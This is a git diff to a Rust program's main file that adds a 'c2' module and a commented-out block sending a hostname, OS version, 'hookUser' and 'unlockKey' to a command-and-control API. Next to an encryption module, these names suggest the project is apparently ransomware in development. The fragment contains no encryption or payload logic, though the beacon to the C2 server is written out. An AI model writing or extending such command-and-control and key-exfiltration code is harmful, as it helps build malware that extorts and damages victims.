@@ -1,8 +1,33 @@
+mod c2;
 mod encryption;
 mod system;
-
+use serde_json::json;
+use serde_json::Value;
 use std::{env, process::exit};
-fn main() {
+
+#[tokio::main]
+async fn main() {
+    /* let c2 = c2::api::C2API::new();
+    let body = json!({
+        "versionOS": "Windows 10",
+        "hosts": "WIN10254",
+        "hookUser": "peter",
+        "unlockKey": "Some_random_key"
+    });
+    let api_res = c2.post(&body, "api/data").await;
+
+    match api_res {
+        Ok(res) => {
+            let json_response: Value = res.json().await.unwrap();
+            println!("{}", json_response)
+        }
+        Err(error) => {
+            if error.is_status() {
+                println!("{}", error.status().unwrap())
+            }
+        }
+    } */
+
     let args: Vec<String> = env::args().collect();
     if args.len() < 2 {
         println!("Missing Arguments");
